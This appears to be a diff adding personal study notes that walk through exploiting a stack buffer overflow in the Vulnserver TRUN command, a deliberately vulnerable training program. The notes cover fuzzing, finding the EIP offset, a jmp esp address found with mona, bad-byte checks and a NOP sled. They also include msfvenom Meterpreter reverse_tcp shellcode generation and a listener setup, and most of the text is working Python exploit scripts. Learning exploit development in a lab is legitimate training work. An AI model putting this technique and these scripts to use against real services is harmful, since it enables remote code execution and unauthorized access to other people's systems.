@@ -1,0 +1,240 @@
+#Basic Overflow Vulnserver TRUN
+
+Run Immunity Debugger --> CPU window double click ctrl + F2 to terminate,  F9 to start
+
+##Fuzzer Code
+s_readline();
+s_string("TRUN ");
+s_string_variable("FUZZ");
+
+##Fuzzer commands
+generic_send_tcp <host_ip> <port e.g 9999> fuzzer.spk
+
+#Create Python Script
+##Python script v1.0
+
+#!/usr/bin/env python
+
+import socket
+s = socket.socket()
+s.connect(("10.0.0.98", 9999))
+
+total_length = 2984
+
+payload = [
+	b"TRUN /.:/",
+	b"A"*total_length
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+
+#Cyclic pattern
+msf-pattern_create -l 2894
+
+copy (by double click)
+then replace b"A"*total_length with b"copied pattern" and send again
+
+copy EIP value from Immunity Debugger registers
+msf-pattern_offset -l 2984 -q EIPvalue -> gets you a match at offset x (e.g 2003)
+
+##Python script v1.1
+
+#!/usr/bin/env python
+
+import socket
+s = socket.socket()
+s.connect(("10.0.0.98", 9999))
+
+total_length = 2984
+offset = 2003
+new_eip = b"BBBB"
+
+payload = [
+	b"TRUN /.:/",
+	b"A"*offset,
+	new_eip,
+	b"C"*(total_length - offset - len(new_eip))
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+
+##Using mona to create a jmp esp instruction
+First drop mona.py into /Immunity Debugger/PyCommands folder
+On Immunity Debugger on the bottom use the white box to use a commandline
+!mona to invoke mona
+!mona <command> <parameter>
+!mona jmp -r esp
+(if it disappears invoke mona with !mona and scroll up to check results)
+we are looking for binary addresses that can execute ascii characters
+copy the address
+
+##Python script v1.2
+
+#!/usr/bin/env python
+
+import socket
+import struct
+
+s = socket.socket()
+s.connect(("10.0.0.98", 9999))
+
+total_length = 2984
+offset = 2003
+new_eip = struct.pack("<I", 0x62501203)
+
+
+payload = [
+	b"TRUN /.:/",
+	b"A"*offset,
+	new_eip,
+	b"C"*(total_length - offset - len(new_eip))
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+
+#Check that it works
+Immunity Debugger    ctrl + F2 -> F9 -> ctrl + g -> 0x62501203 -> F2 (setting a breakpoint) -> run payload -> should have a breakpoint at 0x62501203 -> F7 to step
+
+# Finding bad bytes
+##Python script v1.3
+
+#!/usr/bin/env python
+
+import socket
+import struct
+
+s = socket.socket()
+s.connect(("10.0.0.98", 9999))
+
+all_characters = b"".join([ struct.pack("<B",x) for x in range(1,256) ])
+
+
+total_length = 2984
+offset = 2003
+new_eip = struct.pack("<I", 0x62501203)
+
+
+payload = [
+	b"TRUN /.:/",
+	b"A"*offset,
+	new_eip,
+	all_characters,
+	b"C"*(total_length - offset - len(new_eip) - len(all_characters))
+	
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+
+#Check that it works
+Immunity Debugger    ctrl + F2 -> F9 -> Run the payload -> Follow in Dump the address -> check the last column in dump for the 0-8 succession if not then there is a bad byte
+For Vulnserver TRUN doesnt have any bad bytes except the null byte that we removed on the start with range(1,256)
+
+#Building a NOP sled
+hex 90 is for no operation
+##Python script v1.4
+
+#!/usr/bin/env python
+
+import socket
+import struct
+
+s = socket.socket()
+s.connect(("10.0.0.98", 9999))
+
+all_characters = b"".join([ struct.pack("<B",x) for x in range(1,256) ])
+
+
+total_length = 2984
+offset = 2003
+new_eip = struct.pack("<I", 0x62501203)
+nop_sled = b"\x90" * 16
+
+
+payload = [
+	b"TRUN /.:/",
+	b"A"*offset,
+	new_eip,
+	nop_sled,
+	b"C"*(total_length - offset - len(new_eip) - len(nop_sled))
+	
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+
+#Generate shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -b "\x00" -f py   #here you on -b you can specify bad characters -b "\x00\xfe\x....."
+Copy all the buf = ...   lines from the results
+
+#!/usr/bin/env python
+
+import socket
+import struct
+
+s = socket.socket()
+s.connect(("10.0.0.98", 9999))
+
+all_characters = b"".join([ struct.pack("<B",x) for x in range(1,256) ])
+
+
+total_length = 2984
+offset = 2003
+new_eip = struct.pack("<I", 0x62501203)
+nop_sled = b"\x90" * 16
+
+#paste here all the copied lines
+buf = b ""
+buf += b".............
+...........
+...........
+...........
+
+shellcode = buf
+
+payload = [
+	b"TRUN /.:/",
+	b"A"*offset,
+	new_eip,
+	nop_sled,
+	shellcode,
+	b"C"*(total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
+	
+]
+
+payload = b"".join(payload)
+
+s.send(payload)
+
+s.close()
+
+# Setting listener
+msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST eth0
+set LPORT 4444
+run
+
+
+#Immunity Debugger    ctrl + F2 -> F9 -> Run the payload
+You should get a meterpreter callback
+Now after you get meterpreter back you can run commands getuid, sysinfo, ls etc
